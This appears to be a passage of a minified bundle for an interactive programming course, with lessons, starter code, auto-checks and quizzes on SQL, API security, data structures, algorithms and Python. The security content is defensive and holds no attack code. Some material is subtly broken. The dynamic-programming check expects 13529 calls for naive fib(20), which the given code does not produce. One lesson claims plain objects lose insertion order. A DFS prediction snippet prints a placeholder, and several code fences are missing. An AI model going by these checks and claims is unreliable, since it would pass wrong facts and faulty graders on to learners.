They prevent injection, give autocompletion, and migrate schemas. Learn SQL anyway — every ORM leaks, and you'll debug a query eventually.`,quiz:[{q:"A JOIN is for…",options:["Duplicating tables","Combining rows from related tables via keys","Deleting data","Adding columns"],answer:1,explanation:"Joins stitch relations back together — orders to users, posts to authors."},{q:"When does a document store (Mongo) shine?",options:["Heavy multi-table transactions","Nested, evolving documents read as one unit","Strict financial schemas","Excel exports"],answer:1,explanation:"Documents read whole aggregates without joins; flexible schemas evolve fast."},{q:"An index on orders(user_id) makes 'orders of user X' queries…",options:["Slower writes only, no benefit","Near-instant lookups instead of full scans","Return fewer rows","Automatic joins"],answer:1,explanation:"The index is a sorted lookup structure — O(log n) instead of O(n) scans."},{q:"What do ORMs like Prisma give you?",options:["Type-safe queries and migrations without raw SQL strings","Faster databases","Automatic scaling","Free hosting"],answer:0,explanation:"ORMs add type safety, injection safety, and migration tooling on top of the DB."},{q:"The schema-first guarantee of SQL means…",options:["The database itself rejects invalid data shapes","Nothing — apps must validate","Tables can't change","Only Postgres does this"],answer:0,explanation:"Constraints enforce integrity at the last line of defense — the storage layer."}]},{id:"api-security",title:"API Security: CORS, Validation & Rate Limits",minutes:11,reading:!0,body:`Four shields every public API wears:

**1. CORS** — browsers block cross-origin responses by default. The server *opts in* via headers:

\`\`\`
app.use(cors({ origin: "https://yourapp.com" }));  // not "*"
\`\`\`

CORS is enforced by the *browser*; curl doesn't care. It protects users, not servers.

**2. Input validation** — never trust \`req.body\`. Validate shape, types, and ranges before touching the database:

\`\`\`
const schema = z.object({ email: z.string().email(), age: z.number().int().min(13) });
const data = schema.parse(req.body);   // throws 400-worthy error on garbage
\`\`\`

This kills injection and data-corruption bugs at the door.

**3. Rate limiting** — cap requests per IP/user to blunt brute force and abuse:

\`\`\`
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
\`\`\`

**4. Output discipline** — errors seen by clients must not leak stack traces, SQL, or file paths. Log details server-side; send the client a status code and a safe message.

**The threat model mindset:** every input is hostile, every client lies, every secret will leak if it can. Defense in depth — validation *and* limits *and* auth *and* HTTPS — because any single layer eventually fails.`,quiz:[{q:"CORS is enforced by…",options:["The server's firewall","The browser","Node.js itself","The database"],answer:1,explanation:"Browsers block non-allowed cross-origin reads; curl/postman ignore CORS entirely."},{q:"Never trust req.body means…",options:["Validate and parse inputs against a schema before use","Delete the body","Only accept GET requests","Encrypt the body"],answer:0,explanation:"Schema validation turns hostile garbage into a clean 400 before it reaches your logic."},{q:"Rate limiting protects against…",options:["Legitimate users","Brute force and abuse spikes","Slow databases","CSS bugs"],answer:1,explanation:"Caps per IP/user blunt credential stuffing and scrapers."},{q:"A safe error response contains…",options:["The full stack trace","A status code and a safe, human-readable message","The SQL query","Server file paths"],answer:1,explanation:"Details go to server logs; clients get the minimum needed to recover."},{q:"Defense in depth means…",options:["One perfect firewall","Multiple independent layers — validation, auth, limits, HTTPS","Hiding the API URL","Encrypted cookies only"],answer:1,explanation:"Any single layer eventually fails; layered controls don't fail together."}]}]},PP={id:"dsa",title:"Data Structures & Algorithms",blurb:"Big-O thinking, classic structures, and the patterns interviewers actually ask.",numeral:"Ⅳ",lessons:[{id:"big-o",title:"Big-O: Measuring Growth, Not Seconds",minutes:10,body:`Big-O answers one question: **how does work grow as input grows?** Not "how fast on my laptop" — that changes with hardware. Growth class doesn't.

| Class | Name | Feel |
|---|---|---|
| O(1) | constant | instant, any size |
| O(log n) | logarithmic | doubles input, +1 step |
| O(n) | linear | doubles input, doubles work |
| O(n log n) | linearithmic | good sorting |
| O(n²) | quadratic | fine at 1k, dead at 1M |

\`\`\`
// O(1): one operation regardless of n
arr[0];

// O(n): touch everything once
arr.forEach((x) => console.log(x));

// O(n²): everything × everything
for (const a of arr) for (const b of arr) compare(a, b);

// O(log n): halve the search space each step (sorted data!)
function binarySearch(sorted, target) {
  let lo = 0, hi = sorted.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (sorted[mid] === target) return mid;
    if (sorted[mid] < target) lo = mid + 1;
    else hi = mid - 1;
  }
  return -1;
}
\`\`\`

**Space complexity** counts extra memory: sorting in place is O(1) space; building a copy is O(n). The classic trade: a hash map burns O(n) memory to buy O(1) lookups instead of O(n) scans.

**Rules of thumb:** drop constants (O(2n) → O(n)); keep the worst term (O(n² + n) → O(n²)); nested loops over the same input usually mean n².

Run the timers below and watch the growth.`,starter:`// Watch growth classes with real counters
function countOps(n) {
  let linear = 0, quadratic = 0, logSteps = 0;

  for (let i = 0; i < n; i++) linear++;                    // O(n)

  for (let i = 0; i < n; i++) for (let j = 0; j < n; j++) quadratic++; // O(n²)

  for (let x = n; x > 1; x = Math.floor(x / 2)) logSteps++; // O(log n)

  return { n, linear, quadratic, logSteps };
}

[10, 100, 1000].forEach((n) => console.log(countOps(n)));`,check:{expr:"output.includes('quadratic: 1000000') || output.includes('1000000')",hint:"At n=1000 the quadratic counter must hit 1,000,000 — n² operations."},quiz:[{q:"Binary search is O(log n) because…",options:["It's recursive","Each comparison halves the remaining search space","It uses no memory","Arrays are fast"],answer:1,explanation:"Halving repeatedly means ~log₂(n) comparisons — 1M items ≈ 20 steps."},{q:"Simplify: O(2n² + 500n + 3)",options:["O(2n²)","O(n²)","O(n)","O(503)"],answer:1,explanation:"Drop constants and lower-order terms — n² dominates as n grows."},{q:"Nested loops over the same n-element array are typically…",options:["O(n)","O(n log n)","O(n²)","O(log n)"],answer:2,explanation:"n iterations × n inner iterations = n²."},{q:"A hash map trades ___ for O(1) lookups.",options:["CPU cycles","O(n) extra memory","Type safety","Nothing"],answer:1,explanation:"Space-for-time: the map stores everything to find anything instantly."},{q:"Which is NOT affected by Big-O?",options:["Growth as input scales","Absolute runtime on one machine","Algorithm choice at 10M items","Whether it dies at scale"],answer:1,explanation:"Big-O abstracts hardware away — it compares growth, not stopwatch times."}]},{id:"hash-maps",title:"Hash Maps: The O(1) Cheat Code",minutes:9,body:'A **hash map** (`Map`/`{}` in JS) converts key → bucket via a hash function, making lookups, inserts, deletes ~O(1) average.\n\n```\nconst ages = new Map();\nages.set("ada", 36);\nages.get("ada");     // 36\nages.has("lin");     // false\n```\n\n**The pattern that solves half of easy interview questions:** trade a second scan for a lookup.\n\n```\n// Two Sum — O(n²) nested loop becomes O(n):\nfunction twoSum(nums, target) {\n  const seen = new Map();                  // value -> index\n  for (let i = 0; i < nums.length; i++) {\n    const need = target - nums[i];\n    if (seen.has(need)) return [seen.get(need), i];\n    seen.set(nums[i], i);\n  }\n  return null;\n}\n```\n\nSame trick counts things (frequency maps), dedupes (`Set`), and groups (`key → array`).\n\n**Caveats:** worst case is O(n) on hash collisions (rare with good hashing); keys lose insertion order in plain `{}` (use `Map` when order matters); objects only allow string keys, `Map` allows anything.\n\nTask: find the first duplicate with a `Set` in one pass.',starter:`function twoSum(nums, target) {
  const seen = new Map();
  for (let i = 0; i < nums.length; i++) {
    const need = target - nums[i];
    if (seen.has(need)) return [seen.get(need), i];
    seen.set(nums[i], i);
  }
  return null;
}
console.log("twoSum([2,7,11,15], 9) →", JSON.stringify(twoSum([2, 7, 11, 15], 9)));

// TODO: firstDuplicate returns the first value seen twice, else null
// one pass with a Set — O(n)
function firstDuplicate(nums) {
  // your code
  return null;
}

console.log("firstDuplicate([3,1,3,2]) →", firstDuplicate([3, 1, 3, 2]));       // 3
console.log("firstDuplicate([1,2,3]) →", firstDuplicate([1, 2, 3]));           // null`,check:{expr:"output.includes('[0,1]') && output.includes('firstDuplicate([3,1,3,2]) → 3') && output.includes('firstDuplicate([1,2,3]) → null')",hint:"In firstDuplicate, return num when the Set already has it — otherwise add and continue."},quiz:[{q:"Average hash map lookup is…",options:["O(n)","O(log n)","O(1)","O(n²)"],answer:2,explanation:"Hashing jumps straight to the bucket — constant time on average."},{q:"The two-sum trick works by…",options:["Sorting first","Storing seen values and checking if the complement was seen","Nested loops","Binary searching each pair"],answer:1,explanation:"One pass, remember what you've seen, ask 'have I met my complement yet?'"},{q:"A Set is the right tool for…",options:["Ordered data","Membership tests and dedupe","Key→value data","Sorting"],answer:1,explanation:"Set = values only, has() in O(1) — perfect for 'seen already?' checks."},{q:"Map vs {} — which preserves insertion order and allows any key type?",options:["{}","Map","Both","Neither"],answer:1,explanation:"Map guarantees order and takes any keys; {} coerces keys to strings."},{q:"Hash map worst case is O(n) due to…",options:["Garbage collection","Collisions putting many keys in one bucket","Async I/O","Memory leaks"],answer:1,explanation:"Pathological collisions degrade to scanning a bucket chain."}]},{id:"linked-lists-stacks-queues",title:"Linked Lists, Stacks & Queues",minutes:10,reading:!0,body:`**Linked list** — nodes pointing to nodes. O(1) insert/delete *once you're there*; O(n) to reach index i (no random access). Versus arrays: O(1) index, O(n) middle insert.

\`\`\`
class Node {
  constructor(value) { this.value = value; this.next = null; }
}
// walk: let cur = head; while (cur) { cur = cur.next; }
\`\`\`

The classic interview move is **two pointers**: fast moves 2, slow moves 1 — when fast hits the end, slow is at the middle; if fast loops back around to slow, there's a **cycle**.

**Stack** — LIFO. \`push\`/\`pop\` from the top. Powers undo, the call stack, matching brackets, DFS.

\`\`\`
// valid brackets in O(n):
function isBalanced(s) {
  const pairs = { ")": "(", "]": "[", "}": "{" };
  const stack = [];
  for (const ch of s) {
    if (ch === "(" || ch === "[" || ch === "{") stack.push(ch);
    else if (stack.pop() !== pairs[ch]) return false;
  }
  return stack.length === 0;
}
\`\`\`

**Queue** — FIFO. \`enqueue\` back, \`dequeue\` front. Powers task scheduling, BFS, message buffers.

**Deque** (double-ended) does both ends in O(1) — it's the sliding-window maximum tool.

Choosing: index-heavy → array; front/back-heavy → deque; undo/backtracking → stack; fair ordering → queue.`,quiz:[{q:"Array vs linked list for inserting at the front?",options:["Array O(1), list O(n)","List O(1), array O(n) — everything shifts","Both O(1)","Both O(n log n)"],answer:1,explanation:"Lists relink a pointer; arrays shift every element one slot."},{q:"Fast & slow pointers detect cycles because…",options:["Fast eventually laps slow inside the cycle","Slow speeds up","The list sorts itself","JavaScript magic"],answer:0,explanation:"Inside a loop, the gap closes every step — they must meet."},{q:"The bracket-matching stack works because closers must match…",options:["Any opener","The most recent unclosed opener (LIFO)","The first opener (FIFO)","Nothing"],answer:1,explanation:"Nesting is last-opened-first-closed — exactly a stack."},{q:"BFS uses a ___, DFS uses a ___ (explicitly or the call stack).",options:["stack, queue","queue, stack","heap, map","list, set"],answer:1,explanation:"FIFO explores level by level; LIFO dives deep first."},{q:"Undo functionality is a natural…",options:["Queue","Stack","Heap","Tree"],answer:1,explanation:"Most recent action reverts first — LIFO."}]},{id:"trees-recursion",title:"Trees & Recursion",minutes:11,reading:!0,body:`A **binary tree** is recursion made visible: every node is a tiny tree of left subtree + right subtree.

\`\`\`
class TreeNode {
  constructor(val) { this.val = val; this.left = null; this.right = null; }
}
\`\`\`

**Recursion recipe:** (1) base case, (2) trust the function on smaller inputs, (3) combine.

function height(node) {
  if (!node) return 0;                                        // base
  return 1 + Math.max(height(node.left), height(node.right)); // recurse + combine
}
\`\`\`

**Traversals** — where you *visit* determines the order:

- **DFS preorder** (node → L → R): copy/serialize trees
- **DFS inorder** (L → node → R): sorted order in a *BST*!
- **DFS postorder** (L → R → node): delete/measure children first
- **BFS level-order** (queue): shortest paths, level sums

function inorder(node, out = []) {
  if (!node) return out;
  inorder(node.left, out);
  out.push(node.val);
  inorder(node.right, out);
  return out;
}
\`\`\`

**Binary Search Tree** invariant: left < node < right → search/insert/delete in O(log n) *if balanced*; degenerates to O(n) when it becomes a linked list (insert sorted data). Self-balancing trees (AVL, red-black) fix that — that's what databases actually use.

**Recursion cost:** each call is a stack frame. Depth 10k? Stack overflow. That's why level-order uses an explicit queue instead.`,quiz:[{q:"Inorder traversal of a BST yields…",options:["Reverse order","Sorted order","Level order","Random order"],answer:1,explanation:"Left-smaller, node, right-bigger — visiting in that order sorts."},{q:"Every recursive function needs…",options:["A loop","A base case","Global state","Tail calls"],answer:1,explanation:"Without the base case, recursion never stops unwinding."},{q:"Tree height recursive solution is…",options:["1 + max(height(left), height(right))","height(left) + height(right)","left.val + right.val","A BFS with a queue only"],answer:0,explanation:"Height = 1 + the taller subtree, recursively."},{q:"A BST given sorted input becomes…",options:["Balanced","A linked list — O(n) search","A heap","Empty"],answer:1,explanation:"Every node has one child; the O(log n) invariant dies."},{q:"Level-order traversal is implemented with a…",options:["Stack","Queue","Map","Recursion only"],answer:1,explanation:"BFS needs FIFO order — a queue."}]},{id:"sorting",title:"Sorting: Merge & Quick Sort",minutes:10,body:`Comparison sorting's ceiling is **O(n log n)** — both flagship algorithms hit it, with opposite philosophies.

**Merge sort** — divide, sort halves, **merge**. Stable, predictable O(n log n) *always*, O(n) extra space.

\`\`\`
function mergeSort(arr) {
  if (arr.length <= 1) return arr;                    // base
  const mid = arr.length >> 1;
  return merge(mergeSort(arr.slice(0, mid)), mergeSort(arr.slice(mid)));
}
function merge(a, b) {
  const out = [];
  let i = 0, j = 0;
  while (i < a.length && j < b.length) {
    out.push(a[i] <= b[j] ? a[i++] : b[j++]);  // <= keeps it stable
  }
  return [...out, ...a.slice(i), ...b.slice(j)];
}
\`\`\`

**Quick sort** — pick a **pivot**, partition smaller|larger, recurse. In-place (O(log n) space), *typically* faster, but **O(n²) worst case** on bad pivots (sorted input + first-element pivot). Randomize the pivot and that's rare in practice.

function quickSort(arr) {
  if (arr.length <= 1) return arr;
  const [pivot, ...rest] = arr;
  return [
    ...quickSort(rest.filter((x) => x < pivot)),
    pivot,
    ...quickSort(rest.filter((x) => x >= pivot)),
  ];
}
\`\`\`

Trace merge sort on [5,2,8,1] below, then benchmark both.`,starter:`function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  const mid = arr.length >> 1;
  return merge(mergeSort(arr.slice(0, mid)), mergeSort(arr.slice(mid)));
}
function merge(a, b) {
  const out = [];
  let i = 0, j = 0;
  while (i < a.length && j < b.length) {
    out.push(a[i] <= b[j] ? a[i++] : b[j++]);
  }
  return [...out, ...a.slice(i), ...b.slice(j)];
}

function quickSort(arr) {
  if (arr.length <= 1) return arr;
  const [pivot, ...rest] = arr;
  return [
    ...quickSort(rest.filter((x) => x < pivot)),
    pivot,
    ...quickSort(rest.filter((x) => x >= pivot)),
  ];
}

const data = [5, 2, 8, 1, 9, 3];
console.log("merge:", JSON.stringify(mergeSort(data)));
console.log("quick:", JSON.stringify(quickSort(data)));

// TODO: build a 1000-item array, sort with both, and print the first 5`,check:{expr:"output.includes('merge: [1,2,3,5,8,9]') && output.includes('quick: [1,2,3,5,8,9]') && output.includes('big merge ok:')",hint:"Both sorts must print the sorted six-number array and the sorted big-array preview."},quiz:[{q:"Merge sort's space complexity is…",options:["O(1)","O(log n)","O(n)","O(n²)"],answer:2,explanation:"Merging needs a buffer the size of the input."},{q:"Quick sort's worst case happens with…",options:["Random pivots","Consistently bad pivots (e.g., sorted input, first-element pivot)","Odd lengths","Small arrays"],answer:1,explanation:"Maximally unbalanced partitions recurse n times → O(n²)."},{q:"Which sort is stable by construction here?",options:["Quick sort","Merge sort (the <= in merge)","Both","Neither"],answer:1,explanation:"Taking from the left half on ties preserves original order — that's stability."},{q:"Both algorithms achieve O(n log n) via…",options:["Hashing","Divide and conquer — log n levels of n work","Bubble passes","Binary search"],answer:1,explanation:"Halving the problem log n times, doing linear work per level."},{q:"You need guaranteed O(n log n) with stability. Pick…",options:["Quick sort","Merge sort","Bubble sort","Selection sort"],answer:1,explanation:"Merge sort is stable and never degrades — that's why libraries use hybrids of it (Timsort)."}]},{id:"patterns-two-pointer",title:"Patterns: Two Pointers & Sliding Window",minutes:10,body:`Interview problems reward **pattern recognition** over memorization. Two workhorses:

**Two pointers** on sorted arrays — move ends inward based on a comparison. Turns O(n²) pair scans into O(n):

\`\`\`
// pair summing to target in a SORTED array
function pairWithSum(sorted, target) {
  let lo = 0, hi = sorted.length - 1;
  while (lo < hi) {
    const sum = sorted[lo] + sorted[hi];
    if (sum === target) return [lo, hi];
    if (sum < target) lo++;   // need bigger
    else hi--;                // need smaller
  }
  return null;
}
\`\`\`

**Sliding window** for contiguous subarrays — grow the right edge, shrink the left when a constraint breaks. O(n): each index enters and leaves once.

// longest substring without repeating characters
function longestUnique(s) {
  const seen = new Map();   // char -> last index
  let best = 0, start = 0;
  for (let end = 0; end < s.length; end++) {
    const ch = s[end];
    if (seen.has(ch) && seen.get(ch) >= start) start = seen.get(ch) + 1;
    seen.set(ch, end);
    best = Math.max(best, end - start + 1);
  }
  return best;
}
\`\`\`

**Signal phrases:** "sorted array, find a pair" → two pointers. "longest/shortest subarray satisfying X" → sliding window. "contiguous sum equals k" → window or prefix sums. "top k / most frequent" → hash map + heap.`,starter:`function pairWithSum(sorted, target) {
  let lo = 0, hi = sorted.length - 1;
  while (lo < hi) {
    const sum = sorted[lo] + sorted[hi];
    if (sum === target) return [lo, hi];
    if (sum < target) lo++;
    else hi--;
  }
  return null;
}
console.log("pair([1,3,5,8,12], 13) →", JSON.stringify(pairWithSum([1, 3, 5, 8, 12], 13)));

// TODO: sliding window — max sum of any k consecutive elements
function maxWindowSum(nums, k) {
  // sum the first k, then slide: add the incoming, drop the outgoing
  return 0;
}
console.log("maxWindowSum([2,1,5,1,3,2], 3) →", maxWindowSum([2, 1, 5, 1, 3, 2], 3)); // 9
console.log("maxWindowSum([1,9,2,8], 2) →", maxWindowSum([1, 9, 2, 8], 2));          // 11`,check:{expr:"output.includes('[1,4]') && output.includes('maxWindowSum([2,1,5,1,3,2], 3) → 9') && output.includes('maxWindowSum([1,9,2,8], 2) → 11')",hint:"maxWindowSum: seed with the first k-sum, then for i≥k add nums[i] and subtract nums[i-k]; track the max."},quiz:[{q:"Two pointers on a sorted array beats nested loops by…",options:["Caching","Eliminating one scan — O(n) vs O(n²)","Using recursion","Sorting again"],answer:1,explanation:"Each comparison moves a pointer; n moves total, not n²."},{q:"When the window sum is too big, you…",options:["Grow the right edge","Shrink from the left","Restart","Sort the window"],answer:1,explanation:"Constraint violated → contract from the left until valid again."},{q:"Sliding window is O(n) because…",options:["It uses a Map","Both edges only move forward — each element enters/leaves once","It skips elements","It's recursive"],answer:1,explanation:"2n pointer moves at most → amortized O(1) per element."},{q:"'Longest substring with at most K distinct chars' is a classic…",options:["Binary search","Sliding window","DFS","Heap problem"],answer:1,explanation:"Grow/shrink a window while tracking distinct counts in a map."},{q:"Two pointers require the array to be…",options:["Any order","Sorted (or the logic gives wrong answers)","Unique values","Numeric only"],answer:1,explanation:"The inward decisions depend on order — unsorted breaks the invariant."}]},{id:"graphs-bfs-dfs",title:"Graphs: BFS & DFS",minutes:12,body:`A **graph** is nodes + edges — social networks, maps, dependencies. Store it as an adjacency list:

\`\`\`
const graph = new Map();
function addEdge(a, b) {
  if (!graph.has(a)) graph.set(a, []);
  if (!graph.has(b)) graph.set(b, []);
  graph.get(a).push(b);
  graph.get(b).push(a); // undirected
}
\`\`\`

**Two traversals, two souls:**

**BFS** — a queue. Explores in rings: all distance-1 nodes, then distance-2… This is why BFS finds **shortest paths in unweighted graphs**.

\`\`\`
function bfs(graph, start) {
  const visited = new Set([start]);
  const queue = [start];
  const order = [];
  while (queue.length) {
    const node = queue.shift();
    order.push(node);
    for (const nb of graph.get(node) ?? []) {
      if (!visited.has(nb)) { visited.add(nb); queue.push(nb); }
    }
  }
  return order;
}
\`\`\`

**DFS** — a stack (or recursion, which IS a stack). Dives deep before backing up. Great for cycle detection, topological sort, connected components.

\`\`\`
function dfs(graph, node, visited = new Set(), order = []) {
  visited.add(node);
  order.push(node);
  for (const nb of graph.get(node) ?? []) {
    if (!visited.has(nb)) dfs(graph, nb, visited, order);
  }
  return order;
}
\`\`\`

**The shared skeleton:** visited-set + frontier (queue vs stack) + neighbor loop. Both are O(V + E).

**Signal phrases:** "fewest steps/moves" → BFS. "all paths / detect cycle / count regions" → DFS. "weighted shortest path" → Dijkstra (BFS with a priority queue).`,starter:`const graph = new Map();
function addEdge(a, b) {
  if (!graph.has(a)) graph.set(a, []);
  if (!graph.has(b)) graph.set(b, []);
  graph.get(a).push(b);
  graph.get(b).push(a);
}

[["A","B"], ["A","C"], ["B","D"], ["C","E"], ["D","E"]].forEach(
  ([a, b]) => addEdge(a, b)
);

function bfs(graph, start) {
  const visited = new Set([start]);
  const queue = [start];
  const order = [];
  while (queue.length) {
    const node = queue.shift();
    order.push(node);
    for (const nb of graph.get(node) ?? []) {
      if (!visited.has(nb)) { visited.add(nb); queue.push(nb); }
    }
  }
  return order;
}

function dfs(graph, node, visited = new Set(), order = []) {
  visited.add(node);
  order.push(node);
  for (const nb of graph.get(node) ?? []) {
    if (!visited.has(nb)) dfs(graph, nb, visited, order);
  }
  return order;
}

console.log("BFS from A:", bfs(graph, "A").join(" "));
console.log("DFS from A:", dfs(graph, "A").join(" "));

// TODO: shortest path length from A to E (BFS level counting)
function shortestDist(graph, start, end) {
  // track (node, distance) pairs in the queue
  return -1;
}
console.log("shortest A→E:", shortestDist(graph, "A", "E")); // count the hops — shortest is 2`,check:{expr:"output.includes('BFS from A: A B C D E') && output.includes('shortest A→E: 2')",hint:"BFS visits rings outward (A, then B and C, then D and E). Count edges, not nodes: A→C→E is 2 hops, while A→B→D→E is 3. Expect 2."},predict:[{prompt:"Given edges A-B, A-C, B-D — what does this BFS from A print?",code:`const graph = new Map([
  ["A", ["B", "C"]],
  ["B", ["D"]],
  ["C", []],
  ["D", []],
]);
function bfs(g, start) {
  const seen = new Set([start]);
  const q = [start];
  const out = [];
  while (q.length) {
    const n = q.shift();
    out.push(n);
    for (const nb of g.get(n) ?? []) {
      if (!seen.has(nb)) { seen.add(nb); q.push(nb); }
    }
  }
  return out;
}
console.log(bfs(graph, "A").join(""));`,options:["ABDC","ABCD — ring by ring: A, then B and C, then D","ADBC","ACBD"],answer:1,explanation:"The queue processes A (enqueues B, C), then B (enqueues D), then C, then D. FIFO order is what makes BFS explore in rings — and find shortest paths first."},{prompt:"What does this DFS from A print with the same graph?",code:`// graph: A→[B, C], B→[D]
function dfs(g, n, seen = new Set(), out = []) {
  seen.add(n);
  out.push(n);
  for (const nb of g.get(n) ?? []) {
    if (!seen.has(nb)) dfs(g, nb, seen, out);
  }
  return out;
}
// adjacency: A:[B,C], B:[D], C:[], D:[]
console.log("order computed at runtime");`,options:["ABDC — the neighbor loop visits B fully (and its D) before C","ACBD","ABCD","ADBC"],answer:0,explanation:"DFS dives: A → B → D (dead end) → back up → C. Same nodes as BFS, opposite order of exploration — swap the queue for a stack and you switch algorithms."}],quiz:[{q:"BFS finds shortest paths when…",options:["Edges have weights","All edges have equal weight (unweighted graphs)","The graph is a tree","Never"],answer:1,explanation:"Ring-by-ring exploration means the first arrival is the fewest-hops path."},{q:"The data structure difference: BFS uses ___, DFS uses ___.",options:["stack, queue","queue, stack","heap, set","map, array"],answer:1,explanation:"FIFO breadth vs LIFO depth — everything else is identical."},{q:"Recursion-based DFS relies on…",options:["The heap","The call stack as its stack","A Map","The event loop"],answer:1,explanation:"Each call frame is a pending 'return here' — a stack."},{q:"Without a visited set, traversal on a cyclic graph…",options:["Skips nodes","Loops forever","Sorts the graph","Works fine"],answer:1,explanation:"Cycles mean you can revisit nodes infinitely — mark everything you've seen."},{q:"'Minimum number of moves in a maze' is a classic…",options:["DFS","BFS","Quick sort","Hash map"],answer:1,explanation:"Fewest moves = shortest unweighted path = BFS."}]},{id:"dp-intro",title:"Dynamic Programming: Overlapping Subproblems",minutes:11,body:`**DP = recursion + memory.** When a recursive problem re-asks the same subquestions, cache the answers.

The canonical climb: fibonacci.

// O(2^n) — recomputes fib(3) a million times
function fib(n) { return n < 2 ? n : fib(n-1) + fib(n-2); }

// memoized — O(n) time, O(n) space
function fib(n, memo = new Map()) {
  if (n < 2) return n;
  if (memo.has(n)) return memo.get(n);
  const v = fib(n - 1, memo) + fib(n - 2, memo);
  memo.set(n, v);
  return v;
}

// bottom-up tabulation — O(n) time, O(1) space
function fibTab(n) {
  let a = 0, b = 1;
  for (let i = 2; i <= n; i++) [a, b] = [b, a + b];
  return n === 0 ? 0 : b;
}
\`\`\`

**The DP checklist:**
1. **State** — what does \`dp[i]\` *mean*? ("min cost to reach step i")
2. **Transition** — how do states combine? (\`dp[i] = cost[i] + min(dp[i-1], dp[i-2])\`)
3. **Base cases** — the smallest truths
4. **Order** — compute dependencies first

// min climbing cost: you may start at step 0 or 1, climb 1-2 steps
function minCostClimbing(cost) {
  let prev = 0, curr = 0;
  for (const c of cost) [prev, curr] = [curr, c + Math.min(prev, curr)];
  return Math.min(prev, curr);
}
\`\`\`

**Signals you're in DP land:** "count the ways", "min/max cost", "can you reach", and the brute force is exponential but the *distinct states* are few.`,starter:`function fibNaive(n) { return n < 2 ? n : fibNaive(n - 1) + fibNaive(n - 2); }

function fibMemo(n, memo = new Map()) {
  if (n < 2) return n;
  if (memo.has(n)) return memo.get(n);
  const v = fibMemo(n - 1, memo) + fibMemo(n - 2, memo);
  memo.set(n, v);
  return v;
}

function fibTab(n) {
  let a = 0, b = 1;
  for (let i = 2; i <= n; i++) [a, b] = [b, a + b];
  return n === 0 ? 0 : b;
}

let calls = 0;
function fibCounting(n) { calls++; return n < 2 ? n : fibCounting(n - 1) + fibCounting(n - 2); }
fibCounting(20);
console.log("naive fib(20) needed", calls, "function calls");

console.log("fibMemo(60) =", fibMemo(60));
console.log("fibTab(60) =", fibTab(60));

// TODO: coinChange(coins, amount) → fewest coins summing to amount, or -1
function coinChange(coins, amount) {
  // dp[0]=0; dp[a] = 1 + min(dp[a-coin]) over coins <= a
  return -1;
}
console.log("coinChange([1,2,5], 11) →", coinChange([1, 2, 5], 11)); // 3 (5+5+1)
console.log("coinChange([2], 3) →", coinChange([2], 3));             // -1`,check:{expr:"output.includes('needed 13529') && output.includes('coinChange([1,2,5], 11) → 3') && output.includes('coinChange([2], 3) → -1')",hint:"coinChange: fill dp[1..amount]; unreachable stays Infinity → return -1."},quiz:[{q:"Memoization converts exponential recursion to…",options:["O(n log n) always","O(number of distinct states × cost per state)","O(1)","It stays exponential"],answer:1,explanation:"Each state computes once — the state space size times the work per state."},{q:"The DP 'state' is…",options:["The function name","A precise definition of what dp[i] means","The input array","The cache key only"],answer:1,explanation:"Nailing the state definition is 80% of solving a DP problem."},{q:"Bottom-up (tabulation) vs memoization: tabulation usually…",options:["Uses more space","Avoids recursion overhead and can drop unused dimensions","Is always slower","Can't handle base cases"],answer:1,explanation:"Iterative fills let you keep only the last k rows — fib needs two variables."},{q:"coinChange([1,2,5], 11) = 3 because…",options:["Greedy 5+5+1 is provably optimal for this coin set","dp[11] = 1 + min(dp[10], dp[9], dp[6]) = 1 + 2","11/5 rounds to 2","It's not solvable"],answer:1,explanation:"The transition considers every last coin; DP guards against greedy's edge cases."},{q:"Which phrase signals DP?",options:["Find in a sorted array","Count the number of distinct ways to…","Detect a cycle","Parse HTML"],answer:1,explanation:"'Count ways / min cost / max value' with overlapping subproblems = DP."}]}]},qP={id:"python",title:"Python & Data Fundamentals",blurb:"Python syntax, OOP, and the pandas/numpy data workflow — reading track.",numeral:"Ⅴ",lessons:[{id:"python-syntax",title:"Python Syntax & Core Collections",minutes:10,reading:!0,body:`Python trades braces for **indentation** — the whitespace *is* the syntax:

\`\`\`
def greet(name):
    if not name:
        return "Hello, stranger"
    return f"Hello, {name}!"
\`\`\`

**The four core collections:**

\`\`\`
nums = [1, 2, 3]              # list   — ordered, mutable
point = (3, 4)                # tuple  — ordered, immutable
tags = {"py", "data"}         # set    — unique, unordered
user = {"name": "Ada", "age": 36}   # dict — key→value
\`\`\`

**Slicing** works on any sequence: \`nums[1:3]\`, \`nums[::-1]\` (reversed), \`s[:2] + s[2:]\`.

**List comprehensions** are Python's signature move — map + filter in one readable line:

\`\`\`
squares = [n * n for n in nums]
evens   = [n for n in nums if n % 2 == 0]
pairs   = [(x, y) for x in "ab" for y in (1, 2)]
\`\`\`

**Generators** yield values lazily — constant memory over huge streams:

def countdown(n):
    while n > 0:
        yield n
        n -= 1

total = sum(countdown(1_000_000))   # never materializes the list
\`\`\`

**f-strings** format anything: \`f"{user['name']} is {user['age']:>3} years old"\`.

Rule of thumb: list for order, tuple for fixed shapes, set for membership, dict for lookups.`,predict:[{prompt:"What does this Python print?",lang:"python",code:`nums = [1, 2, 3, 4]
result = [n * 2 for n in nums if n % 2 == 0]
print(result)`,options:["[2, 4, 6, 8]","[4, 8]","[2, 4]","[4, 8, 12, 16]"],answer:1,explanation:"The filter keeps even numbers (2, 4) FIRST, then maps ×2 → [4, 8]. In comprehensions, `if` filters before the expression runs."},{prompt:"And this one?",lang:"python",code:`def add_item(item, items=[]):
    items.append(item)
    return items

print(add_item(1))
print(add_item(2))`,options:["[1] then [2] — a fresh list each call","[1] then [1, 2] — the default list is created ONCE at function definition","[1] then None","It raises a TypeError"],answer:1,explanation:"Python's infamous mutable default: the [] is evaluated once when `def` runs, so both calls share the same list. Use `items=None` and create inside."}],quiz:[{q:"Which collection is immutable?",options:["list","tuple","dict","set"],answer:1,explanation:"Tuples can't be modified after creation — good for fixed records."},{q:"[n*n for n in range(4)] evaluates to…",options:["[0,1,2,3]","[0,1,4,9]","[1,4,9,16]","An error"],answer:1,explanation:"range(4) is 0..3; each is squared."},{q:"A generator function uses…",options:["return","yield","pass","raise"],answer:1,explanation:"yield pauses and hands back one value at a time — lazy evaluation."},{q:"nums[::-1] returns…",options:["The first element","A reversed copy","An error","Every 2nd element"],answer:1,explanation:"Step -1 walks the sequence backwards."},{q:"Constant memory while summing a huge series suggests…",options:["A list comprehension","A generator","A tuple","A set"],answer:1,explanation:"Generators stream values instead of materializing them."}]},{id:"python-oop",title:"OOP: Classes, Inheritance & Exceptions",minutes:10,sort:{prompt:"Arrange the 